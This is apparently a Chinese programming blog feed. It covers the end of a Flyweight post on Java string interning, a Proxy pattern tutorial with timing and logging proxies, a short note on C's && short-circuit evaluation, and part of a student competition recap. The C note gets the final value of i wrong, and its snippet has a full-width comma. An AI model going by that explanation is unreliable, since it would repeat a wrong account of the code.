<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String s1 = <span class="hljs-string">"abc"</span>;<br>        String s2 = <span class="hljs-string">"abc"</span>;<br>        String s3 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">"abc"</span>);<br>        String s4 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">"abc"</span>);<br><br>        <span class="hljs-comment">/**<br>         * 在栈中new出来的String对象，如果发现字符串在常量池中存在，那么就指向这个字符串<br>         */</span><br>        System.out.println(s1 == s2); <span class="hljs-comment">// true</span><br>        System.out.println(s1 == s3); <span class="hljs-comment">// false</span><br>        System.out.println(s3 == s4); <span class="hljs-comment">// false</span><br>        System.out.println(s3.intern() == s1); <span class="hljs-comment">// true intern()去拿常量池中的字符串</span><br>        System.out.println(s3.intern() == s4.intern()); <span class="hljs-comment">// true</span><br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure>

<p>解释一下为什么<br>在Java中，字符串都放在一个常量池中，s1与s2,其实指向的就是同一个对象，所以为true;<br>而s3和s4都是在堆栈中new出来的String对象，那么s3和s4的地址肯定是不一样的，所以s1!=s3,s3!=s4;<br>intern() 方法返回字符串对象的规范化表示形式<br>intern()作用就是去拿常量池中的字符串。如果new出来的是常量的话，那么在堆栈中就指向这个字符串，所以s3.intern()==s1,s3.intern()==s4.intern()</p>
<p>单个享元模式是很好理解的,难度大一点的享元模式是和上一章学的Composite(组合模式)结合的。</p>
<p><img src="https://qiniuyun.fxhstudy.com/Flyweight%2BComposite.png" srcset="/img/loading.gif" title="Flyweight+Composite"><br></p>
<p>图中，A、B…为叶子节点,ABBAAB可以理解为子节点,但是他们共同组成了享元模式。<br>这就是享元模式+组合模式的应用,这里就不多扩展了,主要还是了解享元模式。</p>
</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式9-Proxy</title>
    <url>/article/a3451f99.html</url>
    <content><![CDATA[<p><font size="4" face="PingFang SC">&emsp;&emsp;在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。这种类型的设计模式属于<font color="#FFB6C1" size="5" face="Open Sans">  结构型模式  </font><br>在代理模式中，我们创建具有现有对象的对象，以便向外界提供功能接口。</p>
<p>如果想了解代理模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/proxy-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-代理模式<br></a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Proxy.png" srcset="/img/loading.gif" title="代理模式"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点： </p>
<p>1、职责清晰。<br>2、高扩展性。<br>3、智能化。</p>
<p>缺点： </p>
<p>1、由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。<br>2、实现代理模式需要额外的工作，有些代理模式的实现非常复杂。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>按职责来划分，通常有以下使用场景：<br>1、远程代理。<br>2、虚拟代理。<br>3、Copy-on-Write 代理。<br>4、保护（Protect or Access）代理。<br>5、Cache代理。<br>6、防火墙（Firewall）代理。<br>7、同步化（Synchronization）代理。<br>8、智能引用（Smart Reference）代理。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>我这里就介绍一下静态代理模式，动态代理真的难度很大。我可能也说的不是很清楚。代理是最难的的一种设计模式，<br>然后动态代理就是难上加难。这里我推荐一个也是我最近无意中看到的写的很好的一篇文章，下面第一个评论很好地解释了动态代理，难以理解动态代理的人可以康康</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984" target="_blank" rel="noopener" class="LinkCard">动态代理<br></a></p>
<p>提出要求，要求建立一个Main方法，实现Movable接口中的move()方法，接着在move()方法中输出Runing,睡眠5s以内，然后我想记录睡眠的时间。</p>
<p>代码不难，贴出代码:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">long</span> start = System.currentTimeMillis();<br><br>        System.out.println(<span class="hljs-string">"Moving Moving Moving ..."</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">5000</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">long</span> end = System.currentTimeMillis();<br>        System.out.println(end - start);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">new</span> Main().move();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>代码不难，接着，甲方继续提出要求，记录时间时，不能够修改方法的源码。</p>
<p>首先想到继承，言出码随:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br><br>        System.out.println(<span class="hljs-string">"Moving Moving Moving ..."</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">5000</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">new</span> Main2().move();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Main</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">long</span> start = System.currentTimeMillis();<br>        <span class="hljs-keyword">super</span>.move();<br>        <span class="hljs-keyword">long</span> end = System.currentTimeMillis();<br>        System.out.println(end - start);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>但是!有一件事情，我想提醒你，设计模式中是需要慎用继承的，因为耦合度太大了。<br>于是甲方爸爸就不乐意了，不允许你用继承。难受了，那怎么办啊?</p>
<p>这个时候，就需要用到代理的思想，创建一个代理类，实现Movable接口，这个代理中move()方法记录甲方爸爸想记录的东西，<br>然后这个类中，定义一个Main类型的变量，创建一个有参构造，每次当你创建这个代理类的时候，需要往里面传入一个Main类型的值。<br>也就是说只要将甲方爸爸的要求写入这个MainProxy类中就可以了。</p>
<p>先给出代码:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br><br>        System.out.println(<span class="hljs-string">"Moving Moving Moving ..."</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">5000</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">new</span> MainProxy(<span class="hljs-keyword">new</span> Main()).move();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**<br> * <br> *<br> * 相比继承，聚合的好处在哪里呢?<br> *<br> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br><br>    Main _main;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MainProxy</span><span class="hljs-params">(Main _main)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>._main = _main;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">long</span> start = System.currentTimeMillis();<br>        _main.move();<br>        <span class="hljs-keyword">long</span> end = System.currentTimeMillis();<br>        System.out.println(end - start);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>move()方法只记录了我想记录的东西，剩下的都交给_main去实现，相当于MainProxy就是Main的一个代理<br>但是代理完了，都是同一类型。<br>举个栗子，代理商代理苹果，最后不可能是厂家卖的是苹果，到了代理商这里卖的是三星。所以他们实现的接口一定是一样的(这就是聚合)</p>
<p>完成了甲方爸爸的需求，但是甲方爸爸想了想，觉得应该还有日志记录,访客日志…</p>
<p>无奈，但你也只能满足甲方爸爸一次次提出的无礼的要求:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br><br>        System.out.println(<span class="hljs-string">"Begin Begin Begin ..."</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">5000</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">new</span> MainTimeProxy(<span class="hljs-keyword">new</span> Main()).move();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**<br> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainTimeProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br><br>    Main _main;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MainTimeProxy</span><span class="hljs-params">(Main _main)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>._main = _main;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">long</span> start = System.currentTimeMillis();<br>        _main.move();<br>        <span class="hljs-keyword">long</span> end = System.currentTimeMillis();<br>        System.out.println(end - start);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainLogProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br><br>    Main _main;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MainLogProxy</span><span class="hljs-params">(Main _main)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>._main = _main;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"start ..."</span>);<br>        _main.move();<br>        System.out.println(<span class="hljs-string">"stop ..."</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里我们只是多加了一个MainLogProxy类，采用了聚合的方法，这样我们可以实现多种代理方式。<br>但是这个时候，甲方爸爸又提出了新的要求，我需要满足不同的代理顺序，<br>比如，我有的地方想实现先时间后日志，有的地方想实现先日志后时间。</p>
<p>这时就继承来讲，如果组合使用这些代理中的方法时，先时间后日志，或者先日志后时间<br>就需要设置不同的继承顺序，那么这个Main的体系就非常复杂了。</p>
<p>而相比继承而言，聚合就比较好解决这个复杂的问题<br>但如何通过聚合实现这个功能呢？</p>
<p>分析一下，我们要实现的细节，需要在MainTimeProxy中套着MainLogProxy,MainLogProxy中套着Main<br>而就目前代码而言，我们是不能够实现代理的组合<br>再看一下代码，问题在于，Main每个代理类中，都代理的是Main方法，MainTimeProxy不能聚合MainLogProxy的，这样是实现不了我们的需求的</p>
<p>把代理中的Main类改为Movable？😂,对的,就是这样:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br><br>        System.out.println(<span class="hljs-string">"Begin Begin Begin ..."</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">5000</span>));<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">/*<br>            start ...<br>            Begin Begin Begin ...<br>            stop ...<br>            1083<br>         */</span><br>        <span class="hljs-keyword">new</span> MainTimeProxy(<br>                <span class="hljs-keyword">new</span> MainLogProxy(<br>                        <span class="hljs-keyword">new</span> Main()<br>                )<br>        ).move();<br><br>        <span class="hljs-comment">/*<br>            start ...<br>            Begin Begin Begin ...<br>            1442<br>            stop ...<br>         */</span><br>        <span class="hljs-keyword">new</span> MainLogProxy(<br>                <span class="hljs-keyword">new</span> MainTimeProxy(<br>                        <span class="hljs-keyword">new</span> Main()<br>                )<br>        ).move();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainTimeProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br><br>    Movable m;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MainTimeProxy</span><span class="hljs-params">(Movable m)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.m = m;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">long</span> start = System.currentTimeMillis();<br>        m.move();<br>        <span class="hljs-keyword">long</span> end = System.currentTimeMillis();<br>        System.out.println(end - start);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainLogProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Movable</span></span>&#123;<br><br>    Movable m;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MainLogProxy</span><span class="hljs-params">(Movable m)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.m = m;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">move</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"start ..."</span>);<br>        m.move();<br>        System.out.println(<span class="hljs-string">"stop ..."</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<br>
这个时候再拿出Decorator的结构图
<br>

<p><img src="https://qiniuyun.fxhstudy.com/Decorator%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F4.png" srcset="/img/loading.gif" title="装饰器模式"><br></p>
<p><img src="https://qiniuyun.fxhstudy.com/Proxy.png" srcset="/img/loading.gif" title="代理模式"><br></p>
<p align="center">是不是很像,其实学到后来，会发现很多模式都是互通的，这个最后这个系列写完时，总结一下</p>

<br>

<p>&emsp;&emsp;就这样，你完成成功了甲方爸爸的所有需求，甲方爸爸很满意。学会了静态代理模式，于是你又愉快的度过了一天。</p>
</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>课堂上的一些启发</title>
    <url>/article/a1ddc1f6.html</url>
    <content><![CDATA[<p>我们学校大二要学C#，我之前一直认为我的编程能力还可以，但是这个星期，老师讲到了一个非常小的技巧，让我明白，其实编程不只是单单会用语法那么简单，<br>更重要的是需要我们结合实际如何将我们写的程序变得更加简单，更加高效。</p>
<p>&amp;这个符号在c语言中是一个基本的知识点，</p>
<blockquote>

<div class="hljs code-wrapper"><pre><code>#include &lt;stdio.h&gt;
int main(){
    int i=0,j=0，result;
    result = (i-- &amp;&amp; j--);
}</code></pre></div></blockquote>

<p>从上述代码中我们可以分析一下，-1赋值给i,1赋值给j,而&amp;&amp;具有短路功能，判断i为0时，就不会执行后面的j–了，但是i会减一，这句话执行之后，i的值为1，j的值为0.<br>是不是很奇妙，如果我们将这种方法在某些语句中去替代if,是不是就可以用一个表达式去完成几行代码呢？</p>
<p>U1S1，当时我还是比较震惊的，至少在我的之前用代码去解决问题的时候，在学习这个语法的时候，基本上没有想到这个用法。<br>其实，这件事还挺引起我的重视的，它告诉我，不论是写代码，还是学习，我们都需要学会去思考，不能只是单单地认为我学会了，我会用了，ok，就完事了，更多的是引伸思考，学会举一反三。<br>我认为这才是学习。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>赛后总结(计算机设计大赛)</title>
    <url>/article/27a15ab8.html</url>
    <content><![CDATA[<font size="4" face="PingFang SC">

<p>🔒一下计算机设计大赛吧，昨天最后成绩才出来的，因为忙着写上一篇的设计模式，所以这个就拖下来了。成绩我觉得还行，省一国二，<br>可惜奖状都还没有发下来，等发下来了，再补上吧。</p>
<p>说一下我们比赛流程吧，我们做的是养老互助管理系统。有这个想法是在今年三月份左右的时候，因为两会当时提出了养老互助模式嘛，<br>之后就开始准备做这个了。</p>
<p>我负责做web端的后台管理系统，学长负责的是小程序端，还有个学姐负责的是算法。总体来讲还行吧，但那段时间在学Spring、SpringBoot的时候，真的很焦虑，就是那种，要学的东西太多了，但我啥都不知道。之前的文章里面也说过要学的很多知识点，但从不会到学懂是一个过程，而从学懂到会用也是一个过程。而这个过程要求我在几个星期内完成。。。<br>其实那段时间真的很焦虑，一直学，但你自己知道，你只懂这是一个什么东西，但是要你具体实现时，又是另一回事了。<br>有人会问，可你都大二了，按道理应该都掌握这些知识点了!<br>确实我大二了，但我真正开始学习Java也是从大二上学期开始学习Java的，大一一整个期间我都在学习网安的知识，可以说基本上没有碰过Java。<br>所以对于一个学习时间还没有一年的人来讲，关于Spring、SpringBoot这些会使用，其实还是比较困难的。<br>并且开发你不但要了解怎么使用框架，有很多细节需要注意，还需要知道后端的流程、具体的权限分配、怎么整合第三方框架等等。。。<br>我相信这些并不是一下子就能学会的。所以当时就非常焦虑。</p>
<p>好在后来很多天的学习，再加上学过了Java Web的知识，索性将SpringBoot能够上手了，并且掌握了它的工作的流程。<br>等到后台基本上写好了的时候，那时候的我才算轻松很多，之后我的任务就是根据老师的要求来更换界面的一些基本操作，这里就不是很难了。</p>
<p>在参加省赛的时候，写PPT、文档都是别的同学帮助写的，因为直到交作品的前一天晚上都还在修改小程序的代码，算是时间比较匆忙吧。因为代码都是我们学生自己写的，缺少开发经验，所以BUG就比较多。</p>
<p>省赛就需要提交文档，PPT，演示视频，很多东西，很烦人。但省赛是不需要答辩的，评委根据你做的作品来决定你们的成绩。</p>
